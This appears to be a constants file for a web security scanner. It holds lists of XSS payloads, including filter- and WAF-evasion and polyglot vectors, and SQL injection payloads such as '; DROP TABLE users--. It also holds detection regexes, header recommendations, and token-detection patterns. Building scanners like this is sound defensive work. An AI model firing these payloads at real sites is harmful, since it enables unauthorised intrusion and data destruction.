export const SEVERITY = {
  LOW: { level: "Low", color: "#16a34a" },
  MEDIUM: { level: "Medium", color: "#f59e0b" },
  HIGH: { level: "High", color: "#f97316" },
  CRITICAL: { level: "Critical", color: "#dc2626" }
};

export const XSS_PAYLOADS = [
  // Basic vectors
  "\\\"'><svg/onload=alert(1)>",
  "<img src=x onerror=alert(1)>",
  "javascript:alert(1)",
  "<script>alert(1)</script>",
  "</textarea><script>alert(1)</script>",
  
  // Event handler vectors
  "<body onload=alert(1)>",
  "<input onfocus=alert(1) autofocus>",
  "<select onfocus=alert(1) autofocus><option/select>",
  "<textarea onfocus=alert(1) autofocus>",
  "<keygen onfocus=alert(1) autofocus>",
  "<video><source onerror=alert(1)>",
  "<audio src=x onerror=alert(1)>",
  
  // Context breaking vectors
  "'-alert(1)-'",
  "\"-alert(1)-\"",
  "`-alert(1)-`",
  "</script><script>alert(1)</script>",
  "</style><script>alert(1)</script>",
  "</title><script>alert(1)</script>",
  
  // Filter evasion
  "<ScRiPt>alert(1)</ScRiPt>",
  "<script/src=data:,alert(1)>",
  "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'>",
  "<object data=javascript:alert(1)>",
  "<embed src=javascript:alert(1)>",
  
  // WAF bypass vectors
  "<svg/onload=&#97;lert(1)>",
  "<img src=x onerror=\\u0061lert(1)>",
  "<script>\\u0061lert(1)</script>",
  "<script>eval('\\x61lert(1)')</script>",
  
  // Polyglot vectors
  "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
  "'><svg/onload=alert(/XSS/)>//",
  "<svg onload=alert(1)//",
];

// SQL Injection payloads for detection
export const SQL_INJECTION_PAYLOADS = [
  "' OR '1'='1",
  "' OR 1=1--",
  "\" OR 1=1--",
  "' OR 'a'='a",
  "') OR ('1'='1",
  "\") OR (\"1\"=\"1",
  "' OR 1=1#",
  "\" OR 1=1#",
  "' UNION SELECT NULL--",
  "' AND 1=2 UNION SELECT 1,2,3--",
  "admin'--",
  "admin'#",
  "' WAITFOR DELAY '0:0:5'--",
  "'; DROP TABLE users--",
  "1; DROP TABLE users--",
  "1' AND (SELECT SUBSTRING(@@version,1,1))='M'--",
  "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
];

// Common SQL injection patterns for detection
export const SQL_INJECTION_PATTERNS = [
  /('|\"|`)\s*(or|and)\s*('|\"|`|[0-9])/gi,
  /(union|select|insert|update|delete|drop|create|alter|exec|execute)/gi,
  /(\bor\b|\band\b)\s*[0-9]*\s*=\s*[0-9]*/gi,
  /(--|#|\/\*|\*\/)/g,
  /waitfor\s+delay/gi,
  /information_schema/gi,
  /@@version/gi
];

export const HEADER_RECS = {
  "content-security-policy": "Add a CSP like `default-src 'self';` and tighten script sources.",
  "x-frame-options": "Add X-Frame-Options: DENY or use frame-ancestors in CSP.",
  "x-content-type-options": "Add X-Content-Type-Options: nosniff.",
  "referrer-policy": "Add Referrer-Policy (e.g., strict-origin-when-cross-origin).",
  "strict-transport-security": "Enable HSTS with includeSubDomains; preload where appropriate.",
  "permissions-policy": "Use Permissions-Policy to restrict powerful features (e.g., geolocation=()).",
  "access-control-allow-origin": "CORS: Review if wildcard (*) is appropriate for your API.",
  "access-control-allow-credentials": "CORS: Only set to true if needed, review with ACAO.",
  "access-control-expose-headers": "CORS: Only expose headers that are needed by clients.",
  "access-control-max-age": "CORS: Set appropriate cache duration for preflight requests.",
  "cross-origin-embedder-policy": "Set COEP to protect against Spectre-like attacks.",
  "cross-origin-opener-policy": "Set COOP to isolate browsing context group.",
  "cross-origin-resource-policy": "Set CORP to protect resources from cross-origin requests."
};

// Comprehensive list of security headers to check
export const SECURITY_HEADERS_LIST = [
  "content-security-policy",
  "x-frame-options", 
  "x-content-type-options",
  "strict-transport-security",
  "referrer-policy",
  "permissions-policy",
  "access-control-allow-origin",
  "access-control-allow-credentials", 
  "access-control-expose-headers",
  "access-control-max-age",
  "cross-origin-embedder-policy",
  "cross-origin-opener-policy", 
  "cross-origin-resource-policy",
  "expect-ct",
  "public-key-pins",
  "x-permitted-cross-domain-policies",
  "x-xss-protection"
];

// JWT token patterns for detection
export const JWT_PATTERNS = [
  /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g, // Standard JWT
  /Bearer\s+eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g // Bearer JWT
];

// OAuth patterns for detection  
export const OAUTH_PATTERNS = [
  /access_token=[^&\s]+/g,
  /refresh_token=[^&\s]+/g,
  /authorization_code=[^&\s]+/g,
  /client_id=[^&\s]+/g,
  /client_secret=[^&\s]+/g,
  /state=[^&\s]+/g
];
